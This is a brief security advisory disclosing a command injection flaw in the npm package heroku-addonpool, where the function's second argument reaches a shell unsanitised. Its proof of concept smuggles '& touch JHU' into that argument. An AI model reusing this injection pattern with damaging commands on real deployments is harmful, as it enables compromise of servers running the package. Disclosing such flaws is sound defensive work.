# Overview
`heroku-addonpool` is a tool that Managing Addon Pool of an App in Heroku, this package are vulnerable to Command Injection.

The second parameter of the exported function `HerokuAddonPool(id, app, opt)` can be controlled by users without any sanitization.

# Proof of Concept
```
var Root = require("heroku-addonpool");
var root = Root("sss","& touch JHU",{});
root.setup();
```